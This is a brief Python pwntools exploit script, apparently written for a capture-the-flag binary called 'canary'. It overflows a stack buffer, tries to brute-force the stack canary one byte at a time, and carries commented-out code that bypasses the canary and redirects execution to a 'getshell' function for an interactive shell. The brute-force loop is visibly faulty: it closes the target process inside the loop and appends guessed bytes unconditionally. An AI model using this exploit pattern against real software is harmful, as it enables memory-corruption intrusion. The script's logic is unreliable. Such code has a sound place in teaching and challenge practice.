#!/usr/bin/env python

from pwn import *

context.binary = 'canary'
#context.log_level = 'debug'
io = process('./canary')

get_shell = ELF("./canary").sym["getshell"]

io.recvuntil("Hello Hacker!\n")

# leak Canary
#payload = "A"*(0xe3e8-0xe380)
#io.sendline(payload)
#
#io.recvuntil(payload)
#Canary = u64(io.recv(8))-0xa
#log.info("Canary:"+hex(Canary))

payload = "A"*(0xe3e8-0xe380)
canary = '\x00'
for x in xrange(7):
    for y in xrange(256):
        io.sendline(payload+canary+chr(y))
        try:
            info = io.recv()
            print info
        except:
            io.close()
            continue
        io.close()
        break
    canary += chr(y)
print "success get blasting"
print canary.encode('hex')

## Bypass Canary
#payload = "\x90"*(0xe3e8 - 0xe380)+p64(Canary)+"\x90"*8+p64(get_shell)
#io.send(payload)
#
#io.recv()

io.interactive()
